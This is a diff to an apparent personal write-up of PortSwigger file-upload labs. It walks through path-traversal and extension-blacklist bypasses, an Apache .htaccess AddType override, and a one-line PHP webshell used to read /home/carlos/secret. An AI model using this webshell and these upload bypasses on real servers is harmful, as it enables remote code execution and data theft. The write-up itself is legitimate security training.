@@ -185,3 +185,52 @@ It looks like it works! The response is: `The file avatars/../webshell.php has b
 Now as we found out before, the files are stored in the path: `/files/avatars/filename`. inserting the `../` will therefore save the file in the `/files` directory. If this directory is allowed to execute php code, we should be able to fetch the file from the url `https://laburl.web-security-academy.net/files/webshell.php`. Notice that the payload of the webshell is changed to print the contents of carlos' secret. It works! Secret: `frRFI9DLhyd8RtJCJX32Qjn3UYCl0P0A`. (I hope these secrets are random? I would believe so). We could just as well have used the old webshell. In fact lets try.
 
 That also works! supplying `/files/webshell.php?command=id` outputs: `uid=12002(carlos) gid=12002(carlos) groups=12002(carlos) uid=12002(carlos) gid=12002(carlos) groups=12002(carlos)`. Using `/home/carlos/secret` would also output the secret. This solves the lab!
+
+## Insufficient blacklisting of dangerous file types
+
+While blacklisting is a worse practice than whitelisting, because of the complexity of maintaining a valid and secure blacklist (many different types of files might be omitted), some still use blacklists. Often blacklists can be bypassed by using lesser known file types which are still executeable.
+
+### Overriding the server configuration
+
+Because servers often are configured to only execute files in certain directories. An attacker might be able to override this configuration, allowing for files to be executed in user controlled directories. One example of configuration files are for Apache servers, which will load a directory specific configuration from `.htaccess`.
+
+Microsoft uses IIS servers, where a `web.config` file is used for the same purpose as `.htaccess`. A server which serves JSON files to the user could have the following content i `web.config`:
+
+```xml
+<staticContent>
+    <mimeMap fileExtension=".json" mimeType="application/json" />
+    </staticContent>
+```
+
+Overriding this type of file might be possible, if the server does not dissallow configuration file extensions.
+
+## Lab: Web shell upload via extension blacklist bypass
+
+**Lab Description**:  This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.
+
+To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.
+
+You can log in to your own account using the following credentials: `wiener:peter`
+
+### Lab solution
+
+This lab presents the same avatar upload functionality as we have previously seen. To begin with I uploaded the `webshell.php` to `{labURL}/my-account/avatar` and we are denied the possibility to upload .php files. After this I tried with a regular .png file, which was uploaded just fine. As the lab suggests, it is a bypassable blacklist. I tried with different file types, but non of them executed on the server. This seems to be a clue as to the material about overriding directory permissions, presented before the lab.
+
+Looking at the headers, we see that it is an Apache server we are communicating with:
+
+```http
+HTTP/2 403 
+date: Mon, 22 Apr 2024 18:12:05 GMT
+server: Apache/2.4.41 (Ubuntu)
+content-type: text/html; charset=UTF-8
+x-frame-options: SAMEORIGIN
+content-encoding: gzip
+content-length: 149
+X-Firefox-Spdy: h2
+```
+
+This means that we should try to upload a `.htaccess`, which allows a filetype of our choice to be executed. We should however keep in mind that there is still a blacklist in place, which is probably enforced by the application running on the server. This means we should not try to allow the execution of .php files. I browsed around to look for `.htaccess` formats and commands, but did not find anything related to this particular use case, where I then resorted to looking in the solution hints and found: `AddType application/x-httpd-php .l33t`. This line adds the specified mimetype and configures it as the content-type `application/x-httpd-php`, allowing for execution of the php code within `.l33t` files.
+
+Using the python multipart script from the previous labs and our newly uploaded `.htaccess` file we can now upload a `webshell.l33t` file containing: `<?php echo system($_GET['command']);`. Going back to our account page, we observe that the avatars are fetched from `{labUrl}/files/avatars/`. This means we can execute: `t/files/avatars/webshell.l33t?command=cat /home/carlos/secret`. This gave me the secret and solved the lab!
+
+## Obfuscating file extensions
